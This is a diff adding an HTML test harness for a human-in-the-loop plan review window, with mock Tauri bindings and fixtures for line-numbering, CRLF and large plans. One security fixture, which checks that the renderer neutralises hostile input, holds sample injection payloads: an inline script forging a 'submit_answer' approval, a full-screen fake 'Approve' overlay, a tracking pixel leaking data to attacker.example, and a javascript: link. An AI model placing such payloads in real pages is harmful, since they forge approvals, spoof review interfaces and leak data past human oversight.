@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en" style="background:white;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HITL Plan Review — Test Harness</title>
+    <link rel="stylesheet" href="review.css">
+    <script src="vendor/markdown-it.min.js"></script>
+    <!-- Mock window.__TAURI__ so nothing here needs a running Rust client.
+         Mirrors test-harness.html:10-30. -->
+    <script>
+        window.__TAURI__ = {
+            event: { listen: () => Promise.resolve(() => {}) },
+            core: {
+                invoke: (cmd, args) => {
+                    console.log('[TAURI MOCK] invoke:', cmd, args);
+                    window.__lastInvoke = { cmd, args };
+                    return Promise.resolve();
+                },
+            },
+            window: {
+                getCurrentWindow: () => ({
+                    show: () => Promise.resolve(),
+                    setFocus: () => Promise.resolve(),
+                    close: () => { console.log('[TAURI MOCK] window.close()'); },
+                }),
+            },
+        };
+    </script>
+</head>
+<body style="background:white;">
+    <div id="review-container"></div>
+
+    <script type="module">
+        import { renderPlanReview, renderReviewPanel } from './review.js';
+
+        // ── fixture builders ────────────────────────────────────────────────
+        // A unified diff as `createTwoFilesPatch(..., {context: 999999})` emits
+        // it: full context, one hunk, one file.
+        function buildDiff(ops, eol = '\n') {
+            const oldCount = ops.filter(o => o.type !== '+').length;
+            const newCount = ops.filter(o => o.type !== '-').length;
+            return [
+                '===================================================================',
+                '--- plan.md\tprevious',
+                '+++ plan.md\tcurrent',
+                `@@ -1,${oldCount} +1,${newCount} @@`,
+                ...ops.map(o => o.type + o.text),
+            ].join(eol);
+        }
+
+        function planFixture(contentLines, ops, overrides = {}) {
+            return Object.assign({
+                type: 'plan_review',
+                messageId: 'review-fixture-001',
+                protocolVersion: 2,
+                repo: { name: 'Hitl_MCP', branch: 'work-item/1-reviewplan' },
+                context: 'The agent wants a line-level review before it starts implementing.',
+                summary: 'Adds the **ReviewPlan** tool and a two-pane review window.',
+                displayPath: 'docs/plan-v1.md',
+                planId: 'plan-abc123',
+                revision: 2,
+                isNewPlan: false,
+                snapshotHash: 'sha256:deadbeef',
+                body: { content: contentLines.join('\n'), diff: buildDiff(ops) },
+            }, overrides);
+        }
+
+        // ── fixtures ────────────────────────────────────────────────────────
+        function defaultFixture() {
+            const lines = [];
+            lines.push('# Implementation plan');
+            lines.push('');
+            for (let i = 3; i <= 60; i++) {
+                if (i % 12 === 0) lines.push(`## Section ${i / 12}`);
+                else if (i % 7 === 0) lines.push(`- bullet item on line ${i} with \`inline code\``);
+                else lines.push(`Paragraph line ${i} of the plan, with **bold** and _italic_ text.`);
+            }
+            const ops = lines.map((text, i) => ({ type: i === 9 ? '+' : ' ', text }));
+            ops.splice(20, 0, { type: '-', text: 'This paragraph was removed in this revision.' });
+            return planFixture(lines, ops);
+        }
+
+        // G-1: a plan whose text contains a literal backslash-n two-character
+        // sequence. normalizeNewlines() would turn it into a real newline and
+        // shift every following line number — this fixture proves we do not.
+        function literalBackslashNFixture() {
+            const lines = [
+                '# Escapes',
+                'The sequence \\n is a literal backslash followed by n.',
+                'This must still be line 3.',
+                'And this must still be line 4.',
+            ];
+            return planFixture(lines, lines.map(text => ({ type: ' ', text })));
+        }
+
+        function crlfFixture() {
+            const lines = ['# CRLF plan', 'second line', 'third line', 'fourth line'];
+            const ops = lines.map(text => ({ type: ' ', text }));
+            const msg = planFixture(lines, ops);
+            msg.body.content = lines.join('\r\n');
+            msg.body.diff = buildDiff(ops, '\r\n');
+            return msg;
+        }
+
+        function noTrailingNewlineFixture() {
+            const lines = ['# No trailing newline', 'line two', 'line three'];
+            const ops = lines.map(text => ({ type: ' ', text }));
+            ops.push({ type: '\\', text: ' No newline at end of file' });
+            const msg = planFixture(lines, ops);
+            msg.body.content = lines.join('\n');
+            return msg;
+        }
+
+        // F-5/F-6/F-7: every UI-spoof rung in one plan.
+        function securityFixture() {
+            const lines = [
+                '# Security fixture',
+                // The closing tag is written `<\/script>`: an unescaped literal
+                // would end this inline module in the HTML parser.
+                '<script>window.__xssFired = true; window.__TAURI__.core.invoke("submit_answer", {forged: true});<\/script>',
+                '<div style="position:fixed;inset:0;z-index:9999;background:#fff" id="spoof-overlay">FAKE UI — Approve</div>',
+                '![tracking pixel](https://attacker.example/pixel.png?d=leak)',
+                '[a link](javascript:window.__jsUriFired=true)',
+                'Normal trailing paragraph.',
+            ];
+            return planFixture(lines, lines.map(text => ({ type: ' ', text })));
+        }
+
+        // W3.6 measurement fixture: a real ~100 KB plan.
+        function largeFixture() {
+            const lines = [];
+            let bytes = 0;
+            let i = 0;
+            while (bytes < 100 * 1024) {
+                i++;
+                let line;
+                if (i % 25 === 0) line = `## Section ${i / 25}`;
+                else if (i % 11 === 0) line = `- item ${i}: \`some.identifier(${i})\` and a note about behaviour`;
+                else line = `Line ${i}: a fairly typical sentence of plan prose describing step ${i} in reasonable detail.`;
+                lines.push(line);
+                bytes += line.length + 1;
+            }
+            const msg = planFixture(lines, lines.map(text => ({ type: ' ', text })));
+            msg.displayPath = 'docs/large-plan.md';
+            return msg;
+        }
+
+        const fixtures = {
+            default: defaultFixture,
+            'literal-backslash-n': literalBackslashNFixture,
+            crlf: crlfFixture,
+            'no-trailing-newline': noTrailingNewlineFixture,
+            security: securityFixture,
+            large: largeFixture,
+        };
+
+        // ── wiring ──────────────────────────────────────────────────────────
+        const params = new URLSearchParams(window.location.search);
+        const hash = window.location.hash.replace('#', '');
+        const name = params.get('fixture') || hash || 'default';
+        const state = params.get('state');
+        const failSubmit = params.get('fail') === '1';
+
+        const container = document.getElementById('review-container');
+
+        if (state) {
+            renderReviewPanel(container, {
+                kind: state,
+                have: params.get('have') || 2,
+                need: params.get('need') || 3,
+                displayPath: 'docs/plan-v1.md',
+            });
+        } else {
+            const message = (fixtures[name] || fixtures.default)();
+            window.__fixture = message;
+
+            const controller = renderPlanReview(container, message, {
+                onSubmit: async (payload) => {
+                    console.log('[TEST] onSubmit:', payload);
+                    if (failSubmit) throw new Error('ntfy publish failed (simulated)');
+                    window.__lastSubmit = payload;
+                },
+                onSkip: async () => {
+                    console.log('[TEST] onSkip');
+                    if (failSubmit) throw new Error('ntfy publish failed (simulated)');
+                    window.__lastSkip = true;
+                },
+                onDraftChange: (draft) => { window.__lastDraft = draft; },
+            });
+
+            window.__review = controller;
+            // Event simulators, so the post-first-paint states are exercisable
+            // without a running Rust client.
+            window.__simulateSuperseded = (device) => controller.setSuperseded(device);
+            window.__simulateCancelled = (reason) => controller.setCancelled(reason);
+            window.__simulateAckLost = (reason) => controller.reoffer(reason);
+        }
+    </script>
+</body>
+</html>
